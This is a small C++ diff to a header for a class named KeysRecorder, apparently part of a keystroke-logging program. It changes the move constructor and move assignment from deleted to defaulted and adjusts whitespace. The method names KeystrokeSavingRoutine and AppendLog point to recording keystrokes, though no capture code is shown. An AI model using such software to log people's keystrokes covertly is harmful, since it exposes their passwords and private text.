@@ -23,12 +23,12 @@ public:
     virtual ~KeysRecorder() = default;
 
 	// Copy is forbidden
-	KeysRecorder(const KeysRecorder& other) 			 = delete;
+	KeysRecorder(const KeysRecorder& other) 		   = delete;
 	KeysRecorder& operator=(const KeysRecorder& other) = delete;
 
-	// Move is forbidden
-	KeysRecorder(KeysRecorder&& other) 	  			 = delete;
-	KeysRecorder& operator=(KeysRecorder&& other) 	 = delete;
+	// Move is defaulted
+	KeysRecorder(KeysRecorder&& other) 	  			 = default;
+	KeysRecorder& operator=(KeysRecorder&& other) 	 = default;
 
     void KeystrokeSavingRoutine() noexcept override;
     void AppendLog()              noexcept override;
